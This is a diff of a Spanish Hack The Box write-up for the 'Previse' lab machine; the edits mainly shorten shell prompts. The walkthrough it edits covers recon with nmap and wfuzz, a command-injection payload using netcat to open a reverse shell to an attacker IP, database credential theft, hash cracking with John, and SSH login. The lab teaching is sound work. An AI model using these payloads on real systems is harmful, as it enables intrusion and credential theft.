@@ -36,12 +36,11 @@ En primer lugar y como en cualquier máquina, necesitamos información sobre la 
 
 Asignamos un virtualhost a la máquina en nuestro archivo `/etc/hosts` por motivos de comodidad. Es una buena práctica a mi parecer.
 
-```bash
-wildzarek@p3ntest1ng:~$ sudo echo '10.10.11.104 previse.htb' >> /etc/hosts
+```console
+p3ntest1ng:~$ sudo echo '10.10.11.104 previse.htb' >> /etc/hosts
 ```
 
-Y ahora sí, ya podemos empezar con el reconocimiento de puertos.
-Primero realizamos un `SYN Port Scan`
+Y ahora sí, podemos empezar con el reconocimiento de puertos con un `SYN Port Scan`
 
 | Parámetro | Descripción |
 | --------- | :---------- |
@@ -55,7 +54,7 @@ Primero realizamos un `SYN Port Scan`
 | -oG       | Guarda el output en un archivo con formato grepeable para usar la funcion [extractPorts](https://pastebin.com/tYpwpauW) de [S4vitar](https://s4vitar.github.io/)
 
 ```console
-wildzarek@p3ntest1ng:~$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.104 -oG allPorts
+p3ntest1ng:~$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.104 -oG allPorts
 ```
 
 ![Nmap Scan 1](/assets/images/htb-previse/nmap1.png)
@@ -75,7 +74,7 @@ Identificamos dos puertos abiertos, vamos a obtener más información con un esc
 | -oN       | Guarda el output en un archivo con formato normal      |
 
 ```console
-wildzarek@p3ntest1ng:~$ nmap -sCV -p22,80 10.10.11.104 -oN targeted
+p3ntest1ng:~$ nmap -sCV -p22,80 10.10.11.104 -oN targeted
 ```
 
 ![Nmap Scan 2](/assets/images/htb-previse/nmap2.png)
@@ -89,13 +88,13 @@ Vemos que hay un servidor web corriendo bajo el puerto **80** así que vamos a t
 | -oN       | Guarda el output en un archivo con formato normal |
 
 ```console
-wildzarek@p3ntest1ng:~$ nmap --script http-enum -p80 10.10.11.104 -oN webScan
+p3ntest1ng:~$ nmap --script http-enum -p80 10.10.11.104 -oN webScan
 ```
 
 ![Nmap Scan 3](/assets/images/htb-previse/nmap3.png)
 
 ```console
-wildzarek@p3ntest1ng:~$ whatweb http://previse.htb/
+p3ntest1ng:~$ whatweb http://previse.htb/
 ```
 
 ![whatweb](/assets/images/htb-previse/whatweb.png)
@@ -115,7 +114,7 @@ Puedes usar la que más te guste, yo personalmente prefiero `wfuzz`. Yo acostumb
 En este caso estoy utilizando un diccionario pequeño, si no encontrasemos nada tiraremos de otro más grande.
 
 ```console
-wildzarek@p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc=404 http://previse.htb/FUZZ 2>/dev/null
+p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc=404 http://previse.htb/FUZZ 2>/dev/null
 ```
 
 ![wfuzz de directorios](/assets/images/htb-previse/wfuzz1.png)
@@ -124,7 +123,7 @@ Cuando abrimos la web en el navegador, vemos que automáticamente nos redireccio
 Podemos deducir que habrá más archivos de este tipo, así que vamos a fuzzear la web en busca de más archivos de este tipo.
 
 ```console
-wildzarek@p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc=404 http://previse.htb/FUZZ.php 2>/dev/null
+p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc=404 http://previse.htb/FUZZ.php 2>/dev/null
 ```
 
 ![wfuzz de archivos](/assets/images/htb-previse/wfuzz2.png)
@@ -153,7 +152,7 @@ Registramos una cuenta nueva. Yo puse como usuario `any0ne` y como password `123
 Se observa que tenemos un sistema de subida de archivos y que existe un archivo llamado `sitebackup.zip`. Vamos a descargarlo y descomprimirlo para ver qué contiene.
 
 ```console
-wildzarek@p3ntest1ng:~$ unzip siteBackup.zip
+p3ntest1ng:~$ unzip siteBackup.zip
 ```
 
 ![siteBackup.zip](/assets/images/htb-previse/sitebackup.png)
@@ -185,13 +184,13 @@ delim=comma%26nc+-e+/bin/bash+10.10.14.253+9999
 ```
 
 ```console
-wildzarek@p3ntest1ng:~$ nc -nlvp 9999
+p3ntest1ng:~$ nc -nlvp 9999
 ```
 
 Vamos a mejorar un poco la shell para mayor comodidad, escribiendo lo siguiente:
 
 ```console
-wildzarek@p3ntest1ng:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+p3ntest1ng:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 ![Shell](/assets/images/htb-previse/shell.png)
@@ -199,7 +198,7 @@ wildzarek@p3ntest1ng:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 Anteriormente obtuvimos credenciales de la base de datos analizando el archivo `config.php` así que vamos a echar un vistazo a la base de datos.
 
 ```console
-wildzarek@p3ntest1ng:~$ mysql -h localhost -u root -p previse
+p3ntest1ng:~$ mysql -h localhost -u root -p previse
 ```
 
 ![Database mySQL](/assets/images/htb-previse/dbconnection.png)
@@ -213,8 +212,8 @@ Mientras estamos en la terminal, los caracteres detrás del segundo $ se convier
 El hash correcto es como sigue y lo vamos a romper con `John The Ripper` (esto tardará un rato):
 
 ```console
-wildzarek@p3ntest1ng:~$ echo '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.' > hashfile
-wildzarek@p3ntest1ng:~$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hashfile
+p3ntest1ng:~$ echo '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.' > hashfile
+p3ntest1ng:~$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hashfile
 
 Using default input encoding: UTF-8
 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
@@ -229,7 +228,7 @@ Session completed
 Tenemos la contraseña con la cual ya podemos probar a conectarnos por SSH.
 
 ```console
-wildzarek@p3ntest1ng:~$ sshpass -p "ilovecody112235!" ssh m4lwhere@previse.htb
+p3ntest1ng:~$ sshpass -p "ilovecody112235!" ssh m4lwhere@previse.htb
 ```
 
 ![SSH Connection](/assets/images/htb-previse/sshconnection.png)
